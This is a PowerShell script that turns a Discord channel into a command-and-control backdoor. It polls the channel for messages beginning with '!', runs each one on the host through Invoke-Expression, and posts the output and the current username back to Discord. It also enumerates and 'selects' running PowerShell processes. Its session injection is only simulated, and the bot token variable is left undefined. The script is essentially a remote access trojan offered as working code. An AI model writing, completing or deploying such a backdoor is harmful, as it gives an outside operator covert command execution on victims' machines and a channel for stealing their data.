# Define hardcoded token, channelId, botUserId, and baseUrl
$channelId = "1282419492533698651"
$botUserId = "1282419666022563975"  # Hardcoded bot user ID
$baseUrl = "https://discord.com/api/v10"

# Create a reusable HttpClient
Add-Type -AssemblyName System.Net.Http
$client = New-Object System.Net.Http.HttpClient

# Set the Authorization header for all requests
$client.DefaultRequestHeaders.Authorization = "Bot $token"
$client.DefaultRequestHeaders.Accept.Add("application/json")

# Variable to store the selected session ID
$global:selectedSessionId = $null

# Function to send a message to Discord
function Send-DiscordMessage {
    param (
        [string]$Message
    )

    # Create request body as JSON
    $body = @{
        "content" = $Message
    } | ConvertTo-Json

    # Create StringContent for HTTP Post request
    $content = New-Object System.Net.Http.StringContent($body, [System.Text.Encoding]::UTF8, "application/json")

    # Send the POST request to Discord
    try {
        $response = $client.PostAsync("$baseUrl/channels/$channelId/messages", $content).Result
        if ($response.IsSuccessStatusCode) {
            Write-Host "Message sent successfully."
        } else {
            Write-Host "Error sending message. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
        }
    } catch {
        Write-Host "Error sending message: $_"
    }
}

# Function to list running PowerShell sessions
function List-Sessions {
    # Identify the current user
    $currentUser = whoami
    Send-DiscordMessage -Message "Listing sessions for user: $currentUser"

    # Get running PowerShell processes
    $processes = Get-Process -Name "powershell"

    if ($processes.Count -eq 0) {
        return "No running PowerShell sessions found."
    }

    # Prepare session list with user details
    $sessionList = "User: $currentUser`n"
    $processes | ForEach-Object {
        $sessionList += "Session ID: $($_.Id) - Start Time: $($_.StartTime)`n"
    }

    return $sessionList
}

# Function to execute a command in the selected session
function Execute-InSession {
    param (
        [string]$sessionId,
        [string]$command
    )

    # Check if the session is still running
    $process = Get-Process -Id $sessionId -ErrorAction SilentlyContinue
    if ($process) {
        try {
            # Inject the command into the selected session (simulating interaction)
            # In reality, this would need to attach to the console or run a script in that process's context
            # Simplified example below would log that the command would have been run in the process
            $output = Invoke-Command -ScriptBlock {Invoke-Expression $command} -ErrorAction Stop

            if ($output) {
                $result = $output -join "`n"  # Join multiline output for Discord message
            } else {
                $result = "Command executed successfully with no output."
            }
        } catch {
            $result = "Error executing command: $_"
        }

        # Limit output to a reasonable size for Discord
        if ($result.Length -gt 2000) {
            $result = $result.Substring(0, 1997) + "..."
        }

        Send-DiscordMessage -Message $result
    } else {
        $global:selectedSessionId = $null
        Send-DiscordMessage -Message "Session $sessionId is no longer running."
    }
}

# Function to execute a PowerShell command
function Execute-PowerShellCommand {
    param (
        [string]$command
    )

    # Check if a session has been selected, if so, run the command in that session
    if ($global:selectedSessionId) {
        Execute-InSession -sessionId $global:selectedSessionId -command $command
    } elseif ($command -eq "list_sessions") {
        $result = List-Sessions
        Send-DiscordMessage -Message $result
    } elseif ($command.StartsWith("select_session")) {
        $sessionId = $command.Replace("select_session ", "")
        $process = Get-Process -Id $sessionId -ErrorAction SilentlyContinue
        if ($process) {
            $global:selectedSessionId = $sessionId
            Send-DiscordMessage -Message "Selected session $sessionId. Future commands will be sent to this session."
        } else {
            Send-DiscordMessage -Message "Invalid session ID: $sessionId"
        }
    } else {
        # Execute the command in the current shell context if no session is selected
        try {
            # Run the PowerShell command and capture the output
            $output = Invoke-Expression $command  # Runs the PowerShell command
            if ($output) {
                $result = $output -join "`n"  # Join multiline output for Discord message
            } else {
                $result = "Command executed successfully with no output."
            }
        } catch {
            $result = "Error executing command: $_"
        }

        # Limit output to a reasonable size for Discord
        if ($result.Length -gt 2000) {
            $result = $result.Substring(0, 1997) + "..."
        }

        Send-DiscordMessage -Message $result
    }
}

# Function to get messages from Discord
function Get-DiscordMessages {
    try {
        # Add limit to fetch the most recent messages
        $response = $client.GetAsync("$baseUrl/channels/$channelId/messages?limit=10").Result
        if ($response.IsSuccessStatusCode) {
            $content = $response.Content.ReadAsStringAsync().Result
            return $content | ConvertFrom-Json
        } else {
            Write-Host "Error fetching messages. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
            return $null
        }
    } catch {
        Write-Host "Error fetching messages: $_"
        return $null
    }
}

# Initialize the bot by setting the last processed message ID
function Initialize-LastMessageId {
    $messages = Get-DiscordMessages
    if ($messages) {
        # Set $lastMessageId to the ID of the most recent message so old messages are ignored
        $global:lastMessageId = $messages[0].id
        Write-Host "Bot initialized. Ignoring messages before ID: $lastMessageId"
    }
}

# Initialize the bot
Initialize-LastMessageId

# Main loop with rate limiting and command filtering
while ($true) {
    $messages = Get-DiscordMessages

    if ($messages) {
        foreach ($message in $messages) {
            # Process only if it's a new message and it's not sent by the bot itself
            if ($message.id -gt $lastMessageId -and $message.author.id -ne $botUserId) {
                if ($message.content.StartsWith("!")) {
                    $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase
                    Execute-PowerShellCommand -command $command
                }
                $lastMessageId = $message.id  # Update the last processed message ID
            }
        }
    }

    Start-Sleep -Seconds 5
}
